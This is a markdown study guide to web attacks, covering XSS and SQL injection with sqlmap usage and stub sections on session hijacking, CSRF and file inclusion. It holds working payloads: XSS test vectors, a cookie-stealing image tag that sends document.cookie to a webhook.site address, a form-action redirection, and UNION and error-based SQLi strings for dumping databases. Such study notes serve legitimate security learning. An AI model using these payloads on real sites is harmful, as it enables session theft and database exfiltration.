# Web Attacks
- [Input Validation Attacks](#input-validation-attacks)
  * [Cross-Site Scripting (XSS)](#cross-site-scripting--xss-)
    + [Types of XSS](#types-of-xss)
    + [Goal of XSS](#goal-of-xss)
    + [Flow fo XSS Attack](#flow-fo-xss-attack)
    + [Finding XSS](#finding-xss)
    + [Testing and Exploiting XSS](#testing-and-exploiting-xss)
      - [Common Test](#common-test)
      - [Common Exploit](#common-exploit)
      - [Reflected XSS](#reflected-xss)
      - [Stored XSS](#stored-xss)
      - [DOM XSS](#dom-xss)
        * [Redirection](#redirection)
    + [BeEF-XSS](#beef-xss)
  * [SQL Injections (SQLi)](#sql-injections--sqli-)
    + [Types of SQLi](#types-of-sqli)
      - [In-Band SQLi](#in-band-sqli)
      - [Error-based SQLi](#error-based-sqli)
      - [Blind SQLi / Inferential SQLi](#blind-sqli---inferential-sqli)
    + [Finding SQLi](#finding-sqli)
    + [Exploiting SQLi](#exploiting-sqli)
    + [Automated SQli](#automated-sqli)
      - [SQLMap](#sqlmap)
      - [Fine tuning SQLMap](#fine-tuning-sqlmap)
    + [Manual SQLi](#manual-sqli)
- [Session & Logic Attacks](#session---logic-attacks)
  * [Session Hijacking & Fixation](#session-hijacking---fixation)
  * [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery--csrf-)
  * [Files and Resources Vulnerabilities](#files-and-resources-vulnerabilities)
# Input Validation Attacks
* attack triggered by user input, where input subverts the anticipated function of an application because of insufficient validation on client or server side.

## Cross-Site Scripting (XSS)
* where malicious scripts are injected browser side into otherwise benign and trusted websites.

### Types of XSS
1. Reflected XSS
   * [Reflected XSS](https://owasp.org/www-community/attacks/xss/) are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
2. Stored XSS
   * [Stored attacks](https://owasp.org/www-community/attacks/xss/) are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. 
3. DOM XSS
   * [DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) is where attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. Thus the page itself does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

### Goal of XSS
* Goal of XSS is the same regardless of the type of XSS: 
   1. Cookie Stealing
   2. Getting Complete Control over a Browser
   3. Initiating Exploitation Phasse against Browser Plugins which will Lateral Move to the Machine
   4. Keylogging
* The only difference is how the payload arrives at the server.

### Flow fo XSS Attack
Identify Input Vectors ---> Analyse Insertion Point ---> Check for Filters ---> Exploit 

### Finding XSS
* Review the source of the website
* Search for all places where input from an HTTP request could possibly make its way into the HTML output.
* XSS are usually found on forms and fields in the website which does not have any sanitisation checks.

### Testing and Exploiting XSS
The tests and exploits for XSS are mostly similar. 
#### Common Test
```
(1)
This test script tries to load a bogus img and on error creates an alert box
<img src='aaa' onerror="alert(document.domain);" />

(2) 
This test script builds an svg element which is an alert box
<svg/onload="alert(document.domain)">
```
#### Common Exploit
This leverages webhook.site to steal cookies rather than having our own server.
```
(1)
<img src=" https://webhook.site/11f46906-4e5f-4d08-ae69-9caf44c7e2b7?document.cookie"/>
```
#### Reflected XSS
1. Identifying Reflected XSS
   * Where input is within the html code of the response

#### Stored XSS
1. Identifying Possible Stored XSS
   * Where there is a database to store inputs and displays as output.

#### DOM XSS
* Identifying Possible DOM XSS
   * By inspecting the source using the browser, if input is rendered(printed) on the page but absent in the html source
   * We can infer that input is rendered by the DOM API.
   * Look out for javascript that handles input client side
   * Example : 
   ```
   window.onload = function() {
				var site=document.location.href;
				var index = site.indexOf("=", 0);
				name="";
				if(index != -1) {
					name=site.substr(index+1);
				}
				name=decodeURIComponent(name);
				document.getElementById('name').innerHTML=name;
			} 
   ```
   * From the above javascript, we can see that DOM API `document.location.href` and `document.getElementByID` is used.  
   * The flow of the program is as such, 
      1. when windows is loaded function will be executed. 
      2. Variable `site` is the URL string in URl format of the current page, `index` is index of value where '=' is at and `name` is an empty variable
      3. As long as index is a positive number, variable `name` will be populated with string after '=' 
      4. name is then decoded to strings from its URL format 
      5. variable `name` is printed on to the HTML page with the element name of '*name*'  
   * As can be seen in the flow of program above, DOM
   * References : https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model

* Exploit
##### Redirection
   * Browser ---> Developer ---> Console
   * In console, we want to try to modify the form action.
```
clear() // clear the console
document.forms // command to list out all forms on the page and locate the targeted form.
document.forms[x].action="//example.com" // x is the index of the targeted form and example.com will be the redirection site
```
### BeEF-XSS 
- Browser Exploitation Framework project.
- Tool that can be used as a hook for XSS exploitation.

## SQL Injections (SQLi)
* a type of input validation attack in which SQL commands are injected from the data-plane input in order to affect the execution of predefined SQL commands and access or manupulate the web application's backend database.

### Types of SQLi
#### In-Band SQLi
* occurs when an attacker is able to use the same communication channel to both launch the attack and gather the results.  

#### Error-based SQLi
* is a type of in-band SQLi that relies on error messages thrown by the database to obtain information about the database.

#### Blind SQLi / Inferential SQLi  
* that relies on sending an SQL query to the database which forces the application to return a visibly different result depending on whether the query returns a TRUE or FALSE result.
* [Boolean-Based Blind SQLi Script](https://github.com/irboi746/Tools/blob/main/Web/1.%20BlindSQLi.sh)
* Time-based Blind SQLi is a form of Boolean-based Blind SQLi, just that time is used to do the True/False inference. 
* Pseudo syntax used 
```
MSSQL
-----
IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'
# if user = sa, delay 5 seconds. IF user is not sa, there will be no delay.
MySQL 
----
IF EXIST (SELECT * FROM users WHERE username = 'aa') BENCHMARK(1000000,MD5(1)) 
# if username = aa, do 1000000 MD5(1) calculation, which takes time thus causing delay. 
```  

### Finding SQLi
* Probe all inputs with characters that are known to cause SQL query to be syntatically invalid and forces the web application to return an error.
* These inputs can be GET and POST Requests, HEADERS and COOKIES. \
![SQL_Web_2](https://user-images.githubusercontent.com/88809233/145676430-e695b838-925a-46d8-996c-0abcffa4370b.PNG) 
* As can be seen above, user input required above is 'id' from GET request which can be dangerous when a malicious actor use some operators to make the database query things he wants. 
* Example : 
   * with the addition of `' or 'a'='a` it will turn the original query above to become \
   * `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'` \
   * The above statement tells the database to select the items by checking either of the two conditions when `id` is `null` or `'a' ='a'` an always true condition. This will thus tell the database to select all the items in the `Products` table.

### Exploiting SQLi
* In SQL injection, it is important to 'formulate' a SQL statement of the targeted SQLi query.
* Hence the understanding of Basic SQL SELECT Statement `SELECT <column list> FROM <table> WHERE <condition>` is very important.

### Automated SQli
#### SQLMap
* Basic Syntax
   ```
   GET Request 
   -----------
   sqlmap -u <URL> -p <injection param> [options]
   example :
   sqlmap -u www.example.com/aa.php?id=1' -p id --technique=U
   # this tells sqlmap to test the id parameter of the GET request and use UNION based injection technique 	
   
   POST Request
   ------------
   sqlmap -u <URL> --data=<POST string> -p <param> [options]
   
   ```
* Using Burp Suite with SQLMap extension
   * [BurpSuite Extension](https://portswigger.net/support/using-burp-with-sqlmap)
   * [Install Extension on Burp](https://portswigger.net/support/how-to-install-an-extension-in-burp-suite)
   * [Install Jython Dependencies](https://burpsuite.guide/runtimes/python/)

* Burp Suite and SQLMap separately
   * copy burp request as file   
   ```
   sqlmap -r <request file saved> -p <injection param> [options]
   ```

SQLMap Methodology
1. Extracting Banner of DB
   * Banner grabbing is used to test injection as well as proof the exploitability of the vulnerability.
2. List users of DB
3. Check if web application database user is a database admin
4. List available DB
5. List all tables in DB
6. List columns in table
7. Dump data

[SQL Commands References](https://github.com/sqlmapproject/sqlmap/wiki/Usage) \
Banner Grabbing
```
sqlmap -u <target> --banner <other options>
```

List Users
```
sqlmap -u <target> --users <other options>
```

Checking for DB admin
```
sqlmap -u <target> --is-dba <other options>
```

List all available databases
```
sqlmap -u <target> --dbs <other options>
```

List All Tables
```
sqlmap -u <target> -D <database name> --tables <other options>
```

List Columns 
```
1 table : sqlmap -u <target> -D <database name> -T <table name> --columns <other options>
multiple tables : sqlmap -u <target> -D <database name> -T <table name1, table name2,...> --columns <other options>
```

Dump Data
```
sqlmap -u <target> -D <database name> -T <table name> --C<column list> --dump <other options>
```
#### Fine tuning SQLMap
If DBMS Is Known
```
sqlmap --dbmd=<DBMS> 
```
Blind SQLi
* **--string** : a string which is always present in true output pages
* **--not-string** : a string which is present in false output pages
```
sqlmap -u <URL> --string "<string>"
```
Testing other headers
```
sqlmap -u <URL> --level N

Cookie Header --level 2
User-Agent and Referrer -- level 3
Host -- Level 5
```
Persistent Connection
```
sqlmap -u <URL> --keep-alive
```
Threading
```
sqlmap -u <URL> --threads 7
# 1 - 10 
```
### Manual SQLi
1. Enumerate the number of fields in a Query
   ```
   <valid input> UNION SELECT NULL; -- -
   <valid input> UNION SELECT NULL, NULL; -- -
   <valid input> UNION SELECT NULL, NULL, NULL; -- -
   ... ...
   ```
   * from the above the application is forced to execute the query `SELECT <column1>, <column2> FROM <table> WHERE <column1>=<valid input> UNION SELECT NULL; -- -`
   * This will trigger an error as the query on the left selects two fields while the query on the right select only one field. Hence `SELECT <column1>, <column2> FROM <table> WHERE <column1>=<valid input> UNION SELECT NULL, NULL; -- -` will work without triggering an error.

2. Identifying Field Types
* Most DB<S perform type enforcing i.e integer, strings, char etc.
* Hence in a Table that holds **int** type, when `SELECT 1 UNION 'a';` is run, an error will be triggered.
* Hence we will make use of the command above, and substitute the first null with a constant.
   * If the type used is correct, query will work
   * If the type used is incorrect, an error will be triggered. 
   ```
   <valid input> UNION SELECT 1, NULL, NULL; -- -
   # no error
   <valid input> UNION SELECT 1, 1, NULL; -- -
   # error
   <valid input> UNION SELECT 1, 'a', NULL; -- -
   # no error
   ... ...
   ```
3. Dumping the Database Content
   * A common trick will be to trigger a type conversion error. 
   * Refer to [Pentest Monkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for other databases.
   * Technique for MSSQL
   ```
   <invalid input> OR <valid input> IN (SELECT TOP 1 CAST <sql_function> as varchar(4096))-- 
   ```
    * Relevant Information to Dump : 
     1. Database Version 
        * replace `<sql_function>` with `@@version`
     2. Database username
        * replace `<sql_function>` with `user_name()`
     3. Database name
        * replace `<sql_function>` with `db_name()`
     4. Installed databases
        * replace `<sql_function>` with `db_name(N)`
        * where `N=0,1,2,3, ...`
        * can only see database which the current privilege can access
     5. Tables in a given database
     ```
     <invalid input> OR <valid input> IN 
     (SELECT TOP 1 CAST <sql_function> as varchar(4096)) FROM 
     <database name>..sysobjects WHERE 
     xtype = ‘U’ AND 
     name NOT IN 
     <known table list> 
     
     example : 
     Enum 1
     9999 or 1 IN (SELECT TOP 1 CAST name as varchar(4096)) FROM 
     Products..sysobjects WHERE 
     xtype='U' AND 
     name NOT IN (Baby)
     
     Enum 2
     9999 or 1 in (SELECT TOP 1 CAST name as varchar(4096)) FROM 
     Products..sysobjects WHERE 
     xtype='U' AND name NOT IN 
     (Apparels, Food ... ...)
     ```
     7. Columns names
     ```
     <invalid input> OR <valid input> in (SELECT TOP 1 CAST (<db name>..syscolumns.name as varchar(4096)) FROM    
     <db name>..syscolumns, <db name>..sysobjects WHERE 
     <db name>..syscolumns.id=<db name>..sysobjects.id AND 
     <db name>..sysobjects.name=<table name> NOT IN
     (<Known Column List>)
     
     <db name> name of database we are working on
     <table name> table that we are working on
     <know column list> list of columns already retrieved
     ```
     8. Database data 
    ```
    <invalid input> OR <valid input> in (SELECT TOP 1 CAST (<column name> as varchar(4096)) FROM
    <db name>..<table name> WHERE
    <column name> NOT IN
    (<retrieved data list>); --
    ```
   
# Session & Logic Attacks
## Session Hijacking & Fixation
* HTTP is a stateless protocol, hence to keep track of user session, web app uses cookies, libraries etc. 
* Session Hijacking refers to the exploitation of valid session assigned to user.
* Session Fixation is a form of session hijacking where the attacker fixates a sessionID and forces the victim to use it.

1. Session Hijacking via XSS Cookie Stealing
2. Session Hijacking via Packet Sniffing (Wireshark) 
3. Session Fixation Attack

## Cross-Site Request Forgery (CSRF)
* 
## Files and Resources Vulnerabilities
1. Local File Inclusion attacks
2. Remote File Inclusion attacks
3. Unrestricted File Upload

